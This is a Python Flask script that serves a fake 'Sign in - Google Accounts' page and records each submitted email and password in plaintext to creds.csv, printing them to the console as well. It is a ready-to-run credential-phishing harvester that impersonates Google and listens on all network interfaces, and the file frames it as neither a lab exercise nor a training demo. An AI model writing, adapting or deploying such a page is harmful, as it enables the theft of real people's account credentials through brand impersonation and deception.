from flask import Flask, request

import csv
import os

app = Flask(__name__)

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html lang ="en">
    <head>
    <meta charset="UTF-8">
    <title>Sign in - Google Accounts</title>
    </head>
    <body>
    <h2>Sign in to your Google Account</h2>
    <form action="/log-creds" method="POST">
    <labelEmail:</label><br>
    <input type="text" name="email" placeholder="Email" required><br><br>
    <label>Password</label><br>
    <input type="password" name="password" placeholder="Password" required><br><br>
    <input type="submit" value="Next">
    </form>
    </body>
    </html>
    '''
@app.route('/log-creds', methods=['POST'])
def log_creds():
    email = request.form.get('email')
    password = request.form.get('password')

    print(f" [DEBUG] Email: {email}, Password: {password}\n")


    file_exists = os.path.isfile('creds.csv')
    fieldnames = ['email', 'password']

    with open('creds.csv', 'a', newline='') as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

        if not file_exists:
            writer.writeheader()

        print("[DEBUG] Writing credentials to creds.csv")
        writer.writerow({'email': email, 'password': password})


    return 'Credentials Received'

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
